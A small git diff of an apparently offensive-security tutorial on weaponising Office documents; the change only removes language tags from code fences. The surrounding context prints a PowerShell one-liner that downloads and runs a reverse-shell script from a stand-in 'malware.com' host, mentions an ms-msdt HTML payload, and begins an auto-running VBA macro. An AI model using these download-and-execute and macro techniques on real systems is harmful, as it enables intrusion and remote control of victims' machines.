@@ -16,7 +16,7 @@ Why do security researchers always pop up a calc.exe when doing a Proof-of-Conce
 You can always replace the calc.exe execution with any payload you want like Powershell reverse shell or mshta fileless or anything else that is suitable your appetite but popping up a calc.exe indicated that we can also execute anything we wanted like download and execute malware. Not just a calc.exe execution.
 
 For example, malicious Powershell like below:
-```Powershell
+```
 powershell IEX (New-Object Net.WebClient).DownloadString('https://malware.com/mini-reverse.ps1')
 ```
 
@@ -45,7 +45,7 @@ Edit `word/document.xml`. Search for the `<o:OLEObject` tag (with r:id="rd10") a
 ![image](https://user-images.githubusercontent.com/56353946/203404734-5c0708d6-12fb-466e-b14e-6391eb092f72.png)
 
 Serve the payload in html payload with the ms-msdt scheme at hxxp://malware[.]com/payload.html:
-```HTML
+```
 <!doctype html>
 <html lang="en">
 <head>
@@ -96,7 +96,7 @@ On "Project (Document1)" path, click `ThisDocument`:
 ![image](https://user-images.githubusercontent.com/56353946/203388151-40943f11-58ed-4339-9e42-c64c2a56c47b.png)
 
 Write our malicious macro code, for example:
-```VBA
+```
 Private Sub Document_Open()
 Test
 End Sub
